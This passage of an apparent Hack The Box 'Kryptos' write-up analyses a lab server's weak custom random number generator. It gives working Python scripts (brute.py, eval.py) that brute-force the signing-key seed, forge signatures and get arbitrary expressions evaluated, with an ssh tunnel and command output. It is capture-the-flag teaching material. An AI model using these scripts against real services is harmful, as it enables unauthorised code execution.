<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# scp rijndael@kryptos.htb:&#x2F;home&#x2F;rijndael&#x2F;kryptos&#x2F;kryptos.py .&#x2F;</span><br><span class="line">rijndael@kryptos.htb&#39;s password: </span><br><span class="line">kryptos.py                                                                                                                                                                       100% 2257     6.8KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos#</span><br></pre></td></tr></table></figure>
<p><code>kryptos.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> VerifyingKey, SigningKey, NIST384p</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request, debug</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> hook</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> response <span class="keyword">as</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    <span class="comment"># Taken from the internet - probably secure</span></span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line"></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up the keys</span></span><br><span class="line">seed = random.getrandbits(<span class="number">128</span>)</span><br><span class="line">rand = secure_rng(seed) + <span class="number">1</span></span><br><span class="line">sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)</span><br><span class="line">vk = sk.get_verifying_key()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(msg, sig)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> vk.verify(binascii.unhexlify(sig), msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sk.sign(msg))</span><br><span class="line"></span><br><span class="line"><span class="meta">@route('/', method='GET')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_root</span><span class="params">()</span>:</span></span><br><span class="line">    response = &#123;<span class="string">'response'</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">'Application'</span>: <span class="string">'Kryptos Test Web Server'</span>,</span><br><span class="line">                    <span class="string">'Status'</span>: <span class="string">'running'</span></span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(response, sort_keys=<span class="literal">True</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route('/eval', method='POST')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        req_data = request.json</span><br><span class="line">        expr = req_data[<span class="string">'expr'</span>]</span><br><span class="line">        sig = req_data[<span class="string">'sig'</span>]</span><br><span class="line">        <span class="comment"># Only signed expressions will be evaluated</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> verify(str.encode(expr), str.encode(sig)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Bad signature"</span></span><br><span class="line">        result = eval(expr, &#123;<span class="string">'__builtins__'</span>:<span class="literal">None</span>&#125;) <span class="comment"># Builtins are removed, this should be pretty safe</span></span><br><span class="line">        response = &#123;<span class="string">'response'</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">'Expression'</span>: expr,</span><br><span class="line">                        <span class="string">'Result'</span>: str(result) </span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        <span class="keyword">return</span> json.dumps(response, sort_keys=<span class="literal">True</span>, indent=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a sample expression and signature for debugging purposes</span></span><br><span class="line"><span class="meta">@route('/debug', method='GET')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    expr = <span class="string">'2+2'</span></span><br><span class="line">    sig = sign(str.encode(expr))</span><br><span class="line">    response = &#123;<span class="string">'response'</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">'Expression'</span>: expr,</span><br><span class="line">                    <span class="string">'Signature'</span>: sig.decode() </span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(response, sort_keys=<span class="literal">True</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">81</span>, reloader=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>First thing I noticed was that It’s a server which runs on <code>localhost</code> on port 81 :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run(host&#x3D;&#39;127.0.0.1&#39;, port&#x3D;81, reloader&#x3D;True)</span><br></pre></td></tr></table></figure>
<p>I checked the listening ports on the box and the server was running :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rijndael@kryptos:~$ netstat -ntlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">rijndael@kryptos:~$</span><br></pre></td></tr></table></figure>
<p>There’s a route called <code>/eval</code> which accepts POST requests in <code>json</code> and evaluates whatever is in <code>expr</code>, However there are two problems, first one is that it only evaluates signed expressions, second one is that even if we could bypass that protection we can’t execute something useful because <code>builtins</code> are disabled :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@route('/eval', method='POST')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        req_data = request.json</span><br><span class="line">        expr = req_data[<span class="string">'expr'</span>]</span><br><span class="line">        sig = req_data[<span class="string">'sig'</span>]</span><br><span class="line">        <span class="comment"># Only signed expressions will be evaluated</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> verify(str.encode(expr), str.encode(sig)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Bad signature"</span></span><br><span class="line">        result = eval(expr, &#123;<span class="string">'__builtins__'</span>:<span class="literal">None</span>&#125;) <span class="comment"># Builtins are removed, this should be pretty safe</span></span><br><span class="line">        response = &#123;<span class="string">'response'</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">'Expression'</span>: expr,</span><br><span class="line">                        <span class="string">'Result'</span>: str(result) </span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        <span class="keyword">return</span> json.dumps(response, sort_keys=<span class="literal">True</span>, indent=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span></span><br></pre></td></tr></table></figure>
<p>Let’s take a look at the keys and the secure random number generator function (<code>secure_rng</code>) :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    <span class="comment"># Taken from the internet - probably secure</span></span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line"></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up the keys</span></span><br><span class="line">seed = random.getrandbits(<span class="number">128</span>)</span><br><span class="line">rand = secure_rng(seed) + <span class="number">1</span></span><br><span class="line">sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)</span><br><span class="line">vk = sk.get_verifying_key()</span><br></pre></td></tr></table></figure>
<p>I noticed this comment :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from the internet - probably secure</span></span><br></pre></td></tr></table></figure>
<p>I took the <code>rng</code> function from the script and wrote a script to test how random is it :<br><code>test.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> VerifyingKey, SigningKey, NIST384p</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request, debug</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> hook</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> response <span class="keyword">as</span> resp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    seed = random.getrandbits(<span class="number">128</span>) </span><br><span class="line">    rand = secure_rng(seed) + <span class="number">1</span> </span><br><span class="line">    <span class="keyword">print</span> rand</span><br></pre></td></tr></table></figure>
<p>I set the range to <code>15</code> to print 15 samples :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# .&#x2F;test.py </span><br><span class="line">7470457370149431962811031290883090829243224817138100905771457032768589009029</span><br><span class="line">8</span><br><span class="line">14940914740298863925622062581766181658486449634276201811542914065537178018057</span><br><span class="line">2</span><br><span class="line">3735228685074715981405515645441545414621612408569050452885728516384294504515</span><br><span class="line">7470457370149431962811031290883090829243224817138100905771457032768594247974</span><br><span class="line">1</span><br><span class="line">59763658961195455702488250327064726633945798537104807246171656262148712072266</span><br><span class="line">18</span><br><span class="line">14940914740298863925622062581766181658486449634276201811542914065537178345497</span><br><span class="line">1</span><br><span class="line">7470457370149431962811031290883090829243224817138100905771457032768589172749</span><br><span class="line">29881829480597727851244125163532363316972899268552403623085828131074356036133</span><br><span class="line">12</span><br><span class="line">396</span><br></pre></td></tr></table></figure>
<p>As you can see, it’s not that “random”</p>
<h2 id="kryptos-py-Bruteforcing-the-Seed"><a href="#kryptos-py-Bruteforcing-the-Seed" class="headerlink" title="kryptos.py: Bruteforcing the Seed"></a>kryptos.py: Bruteforcing the Seed</h2><p>Knowing that the random number generator is not random enough, It’s possible to bruteforce the seed.<br>I tunneled port 81 to my box :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb</span><br><span class="line">rijndael@kryptos.htb&#39;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 4.15.0-46-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Thu Sep 19 22:10:59 2019 from 10.10.xx.xx</span><br><span class="line">rijndael@kryptos:~$</span><br></pre></td></tr></table></figure>
<p>Then I wanted to test the server response :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# curl -X POST http:&#x2F;&#x2F;127.0.0.1:81&#x2F;eval -H &#39;Content-Type: application&#x2F;json&#39; -d &#39;&#123;&quot;expr&quot;: &quot;1+1&quot;, &quot;sig&quot;: &quot;123&quot;&#125;&#39;</span><br><span class="line">Bad signature</span><br></pre></td></tr></table></figure>
<p>I wrote a script to bruteforce the seed :<br><code>brute.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> VerifyingKey, SigningKey, NIST384p</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request, debug</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> hook</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> response <span class="keyword">as</span> resp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sk.sign(msg))</span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    expr = <span class="string">"1+1"</span></span><br><span class="line">    seed = random.getrandbits(<span class="number">128</span>) </span><br><span class="line">    rand = secure_rng(seed) + <span class="number">1</span> </span><br><span class="line">    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) </span><br><span class="line">    vk = sk.get_verifying_key() </span><br><span class="line">    sig = sign(expr) </span><br><span class="line">    </span><br><span class="line">    req = requests.post(<span class="string">'http://127.0.0.1:81/eval'</span>, json=&#123;<span class="string">'expr'</span>: expr, <span class="string">'sig'</span>: sig&#125;)</span><br><span class="line">    response = req.text</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">"Bad signature"</span>:</span><br><span class="line">        <span class="keyword">print</span> YELLOW + <span class="string">"[-] Attempt "</span> + str(num) + <span class="string">": failed"</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> GREEN + <span class="string">"[+] Found the seed: "</span> + str(seed)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
<p>The script sends a simple expression : <code>1+1</code> and uses the functions from <code>kryptos.py</code> to sign it, every attempt the server responds with <code>Bad signature</code> it regenerates the signing key and tries again.<br>It could find the right seed after 2 attempts, however sometimes it takes between 30-40 attempts and sometimes it takes more than 100 attempts. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# .&#x2F;brute.py</span><br><span class="line">[-] Attempt 1: failed</span><br><span class="line">[-] Attempt 2: failed</span><br><span class="line">[+] Found the seed: 78272723826101975912150018057949619293</span><br></pre></td></tr></table></figure>
<p>I wrote this script to sign and evaluate expressions depending on the given seed :<br><code>eval.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> VerifyingKey, SigningKey, NIST384p</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request, debug</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> hook</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> response <span class="keyword">as</span> resp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(sk,msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sk.sign(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eval</span><span class="params">(seed,expr)</span>:</span> </span><br><span class="line">	rand = secure_rng(seed) + <span class="number">1</span> </span><br><span class="line">	sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) </span><br><span class="line">	vk = sk.get_verifying_key() </span><br><span class="line">	sig = sign(sk,expr)</span><br><span class="line">	req = requests.post(<span class="string">'http://127.0.0.1:81/eval'</span>, json=&#123;<span class="string">'expr'</span>: expr, <span class="string">'sig'</span>: sig&#125;)</span><br><span class="line">	response = req.text</span><br><span class="line">	<span class="keyword">print</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span> :</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Usage: &#123;&#125; &lt;seed&gt; &lt;expression&gt;"</span>.format(sys.argv[<span class="number">0</span>])</span><br><span class="line">	exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	seed = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">	expr = sys.argv[<span class="number">2</span>]</span><br><span class="line">	eval(seed,expr)</span><br></pre></td></tr></table></figure>
<p>Let’s try the seed we got :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos# ./eval.py 78272723826101975912150018057949619293 1+1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"response"</span>: &#123;</span><br><span class="line">    <span class="attr">"Expression"</span>: <span class="string">"1+1"</span>,</span><br><span class="line">    <span class="attr">"Result"</span>: <span class="string">"2"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It worked.</p>
<h2 id="kryptos-py-Exploitation-Root-Flag"><a href="#kryptos-py-Exploitation-Root-Flag" class="headerlink" title="kryptos.py: Exploitation, Root Flag"></a>kryptos.py: Exploitation, Root Flag</h2><p>We still have the problem of disabled <code>builtins</code>, as you can see we can’t do anything :</p>
